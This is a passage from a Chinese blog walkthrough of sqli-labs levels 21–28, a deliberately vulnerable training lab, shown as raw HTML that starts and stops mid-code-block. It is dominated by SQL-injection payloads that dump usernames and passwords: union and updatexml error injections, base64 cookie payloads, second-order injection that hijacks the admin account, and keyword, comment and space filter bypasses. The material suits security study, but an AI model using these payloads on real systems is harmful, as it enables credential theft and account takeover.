1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br></pre></td></tr></table></figure></li></ol><h2 id="21-22-base64加密Cookie方式的联合注入"><a href="#21-22-base64加密Cookie方式的联合注入" class="headerlink" title="21-22(base64加密Cookie方式的联合注入)"></a>21-22(base64加密Cookie方式的联合注入)</h2><ol><li><p>测试并判断注入类型<br>通过输入admin，可以得到如下界面：<br><img src="/simg/sqli-labs_21.png" alt="返回情况"><br>通过观察，发现cookie变成了：uname &#x3D; YWRtaW4<br>有经验后可以判断出是经过了base64加密，于是我们用解密工具，可以解出值为：admin<br>接下来判断注入类型，开启burp抓包，把base64加密后的’修改到cookie，如下所示：<br><img src="/simg/sqli-labs_21_2.png" alt=" "><br>得到报错信息，可知注入方式为 ‘)</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,database(),version() #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsZGF0YWJhc2UoKSx2ZXJzaW9uKCkgIw==</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodGFibGVfbmFtZSkgZnJvbSBpbmZvcm1hdGlvbl9zY2hlbWEudGFibGVzIHdoZXJlIHRhYmxlX3NjaGVtYT0nc2VjdXJpdHknICM=</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27; #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfbmFtZT0ndXNlcnMnICM=</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;) union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users #</span><br><span class="line">JykgdW5pb24gc2VsZWN0IDEsMixncm91cF9jb25jYXQodXNlcm5hbWUsJzonLHBhc3N3b3JkKSBmcm9tIHVzZXJzICM=</span><br></pre></td></tr></table></figure></li></ol><ul><li>第22关<br>和第21关差不多，只不过注入方式是 “<br>修改一下就可以用了</li></ul><h2 id="23-GET方式的恒为真联合注入"><a href="#23-GET方式的恒为真联合注入" class="headerlink" title="23(GET方式的恒为真联合注入)"></a>23(GET方式的恒为真联合注入)</h2><ol><li>测试并判断注入类型<br>输入<code>?id=1</code> 返回用户名和密码<br>输入<code>?id=1&#39;</code> 返回报错<br>输入<code>?id=1&#39;order by 3 --+</code> 返回报错<br>输入<code>?id=1&#39;order by 3 #</code> 返回报错<br>可以查看源码，发现了一个preg_replace()函数<br>这里作用是相当于将$id中的$reg类型的字符转变位$replace字符，也就是将$id中的#和--置空过滤<br>说明注释被过滤了，那么接下来将提供两种思路</li></ol><ul><li>第1种<br>采用URL终止符<code>%00</code></li></ul><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 4; %00</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,3; %00</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),version(); %00</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#x27;security&#x27;; %00</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;users&#x27;; %00</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,password) from users; %00</span><br></pre></td></tr></table></figure></li></ol><ul><li>第2种<br>单引号闭合<code>?id=1&#39; or &#39;1&#39;=&#39;1</code></li></ul><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,2,3,4 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 6,database(),3 or &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27; union select 6,version(),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,(select group_concat(username,&#x27;:&#x27;,password) from users),3 or &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li></ol><h2 id="24-POST方式的二次注入"><a href="#24-POST方式的二次注入" class="headerlink" title="24(POST方式的二次注入)"></a>24(POST方式的二次注入)</h2><ol><li><p>测试并判断注入类型<br>进入页面，我们可以看到有3个页面：log in, forgot password, new user<br>在log in 页面输入错误的账户名密码时，会返回错误页面。而当输入正确时，返回正确页面，并且可以更改密码。<br>查看源码时，可以发现，登录和注册页面都使用了mysql_real_escape_string()函数。<br>mysql_real_escape_string()函数的作用简单来说，是转义SQL语句中使用的字符串中的特殊字符。详细可看：<a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">PHP mysql_real_escape_string() 函数</a><br>因此，我们无法通过用户名和密码进行注入。但是，我们在查看pass_change.php时，可以发现这一行语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$username<span class="operator">=</span> $_SESSION[&quot;username&quot;];</span><br></pre></td></tr></table></figure><p>也即修改密码时，用户名不会转义。<br>通常情况下，我们并不知晓admin的账户密码，因此只能猜测用户名是admin，去创造一个新用户为<code>admin&#39;#</code>的账号来绕过admin，修改admin的密码。这里涉及到了二次注入的概念。<br>二次注入：攻击者构造的恶意数据存储在数据库后，恶意数据被读取并进入到SQL查询语句所导致的注入。防御者可能在用户输入恶意数据时对其中的特殊字符进行了转义处理，但在恶意数据插入到数据库时被处理的数据又被还原并存储在数据库中，当Web程序调用存储在数据库中的恶意数据并执行SQL查询时，就发生了SQL二次注入。<br>二次注入，可以概括为以下两步:<br>第一步：插入恶意数据进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。<br>第二步：引用恶意数据开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p></li><li><p>注册新用户绕过admin修改admin的密码<br>首先注册一个账号，名为<code>admin&#39;#</code><br>密码123456<br>然后登录该账号<br>再修改密码为111111<br>可以看到页面显示修改成功<br>我们再次登录，账号：admin  密码：111111<br>发现管理员账户登录就成功了。</p></li></ol><h2 id="25-25a-双写绕过的联合注入"><a href="#25-25a-双写绕过的联合注入" class="headerlink" title="25-25a(双写绕过的联合注入)"></a>25-25a(双写绕过的联合注入)</h2><ol><li>测试并判断注入类型<br>首先本关页面出现了明显提示，or和and似乎都不能使用了。但我们检查源码时，我们可以发现这一段函数<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/AND/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>从这个函数可以发现，or和and被替换成空了，但这个替换只会检查一次所有字符，将字符里的所有含or或and的字符替换成空字符。<br>下面尝试注入</li></ol><p><code>?id=1</code><br>返回正常<br><code>?id=1&#39;</code><br>返回错误<br>因此可以以这种方式注入<code> ?id=1&#39; --+ </code><br>但要注意，语句中存在or字符时，需要写成oorr，这样中间的or被替换为空字符后，剩下的字符仍然能构成or<br>and字符也是同理<br>By the way, 函数只是把or和and字符过滤，但和or字符相同含义的||没有被过滤，and字符相同含义的&amp;&amp;没有被过滤。因此有时也可用||和&amp;&amp;代替。</p><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;oorrder by 4 --+</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,2,3 --+</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;union select 1,database(),version() --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=&#x27;security&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=&#x27;users&#x27; --+</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,2,group_concat(username,&#x27;:&#x27;,passwoorrd) from users --+</span><br></pre></td></tr></table></figure></li></ol><ul><li>第25a关<br>与25关类似，只是没有单引号</li></ul><h2 id="26-26a-括号绕过空格的报错注入或联合注入"><a href="#26-26a-括号绕过空格的报错注入或联合注入" class="headerlink" title="26-26a(括号绕过空格的报错注入或联合注入)"></a>26-26a(括号绕过空格的报错注入或联合注入)</h2><ol><li>测试并判断注入类型<br>源码审计<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/or/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//strip out OR (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/and/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out AND (non case sensitive)</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//strip out /*</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out --</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);     <span class="comment">//Strip out #</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\s]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces</span></span><br><span class="line">  <span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\\\\]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out slashes</span></span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>我们可以看到，这一次，不仅仅是or与and，还多过滤了好几种情况<br>我们只需要绕过即可，对于空格有几种方式：</li></ol><ul><li>编码绕过<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">%09 TAB键（空格）  %0A 新建一行（空格）</span><br><span class="line">%0C 新的一页       %0D return即回车功能（php-5.2.17,5.3.29成功）</span><br><span class="line">%0B TAB键（垂直）  %A0 空格（php-5.2.17成功）</span><br></pre></td></tr></table></figure></li><li>括号绕过<br>用()绕过，不使用任何空格</li><li>以上方法不一定都对自己的配置有效，需要尝试</li></ul><ul><li>第1种<br>这里使用()的方式绕过空格</li></ul><ol start="2"><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#x27;security&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#x27;users&#x27;)),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;||updatexml(1,concat(&#x27;~&#x27;,(select(concat(&#x27;~&#x27;,id,&#x27;~&#x27;,username,&#x27;~&#x27;,passwoorrd))from(users)limit%0b0,1)),0)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li></ol><ul><li>第2种<br>这里使用%0b的方式绕过空格，%26%26绕过and</li></ul><ol start="2"><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;%0bunion%0bselect%0b1,database(),3%26%26&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=&#x27;%0bunion%0bselect%0b1,version(),3%26%26&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;union%0bselect%0b1,group_concat(table_name),3%0bfrom%0binfoorrmation_schema.tables%0bwhere%0btable_schema=&#x27;security&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=&#x27;union%0bselect%0b1,group_concat(column_name),3%0bfrom%0binfoorrmation_schema.columns%0bwhere%0btable_schema=&#x27;security&#x27;%0baandnd%0btable_name=&#x27;users&#x27;%26%26%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=&#x27;union%0bselect%0b1,group_concat(username,0x7e,passwoorrd),3%0bfrom%0busers%0bwhere%0b&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li></ol><ul><li>第26a关<br>与26关相比，只是闭合方式变更为’)</li></ul><h2 id="27-27a-大小写绕过或双写绕过的报错注入"><a href="#27-27a-大小写绕过或双写绕过的报错注入" class="headerlink" title="27-27a(大小写绕过或双写绕过的报错注入)"></a>27-27a(大小写绕过或双写绕过的报错注入)</h2><ol><li><p>测试并判断注入类型<br>本关通过查看源码可知，select和union被过滤了，但and和or这次没被过滤</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/m&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/UNION/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/SELECT/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out SELECT</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Union/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out Union</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/Select/s&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out select</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题不大，可以通过大小写或重写绕过</p></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(database())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(version())),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(table_name))from(information_schema.tables)where(table_schema)=&#x27;security&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(group_concat(column_name))from(information_schema.columns)where(table_name)=&#x27;users&#x27;),0x7e),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆数据</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;||updatexml(1,concat(0x7e,(sElect(concat(username,&#x27;:&#x27;,password))from(users)limit%0b0,1)),1)||&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure></li></ol><ul><li>第27a关<br>与27关相比，只是闭合方式变更为”</li></ul><h2 id="28-28a-双写或加字符绕过的联合注入"><a href="#28-28a-双写或加字符绕过的联合注入" class="headerlink" title="28-28a(双写或加字符绕过的联合注入)"></a>28-28a(双写或加字符绕过的联合注入)</h2><ol><li>测试并判断注入类型<br>查看源码<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">blacklist</span>(<span class="params"><span class="variable">$id</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[\/\*]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//strip out /*</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[--]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out --.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[#]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);<span class="comment">//Strip out #.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="comment">//$id= preg_replace(&#x27;/select/m&#x27;,&quot;&quot;, $id);    //Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[ +]/&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out spaces.</span></span><br><span class="line"><span class="variable">$id</span>= <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/union\s+select/i&#x27;</span>,<span class="string">&quot;&quot;</span>, <span class="variable">$id</span>);    <span class="comment">//Strip out UNION &amp; SELECT.</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$id</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>绕过union和select，选择重写或加字符绕过<br>末尾选择字符串截断%00<br>或<code>%0aand(&#39;1</code></li></ol><h1 id="第1种"><a href="#第1种" class="headerlink" title="第1种"></a>第1种</h1><ol start="2"><li><p>猜解SQL查询语句中的字段数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;)%0Aorder%0Aby%0A4%0Aand(&#x27;1</span><br></pre></td></tr></table></figure></li><li><p>爆出显示位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,3%0aand(&#x27;1</span><br></pre></td></tr></table></figure></li><li><p>获取当前数据库名和数据库版本号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,database(),3%0aand(&#x27;1</span><br><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,version(),3%0aand(&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆表</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=a&#x27;)%0aunion%0aunion%0aselectselect%0a1,2,group_concat(table_name)%0afrom%0ainformation_schema.tables%0awhere%0atable_schema=&#x27;security&#x27;%0aand(&#x27;1</span><br></pre></td></tr></table></figure></li><li><p><strong>爆字段名</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td 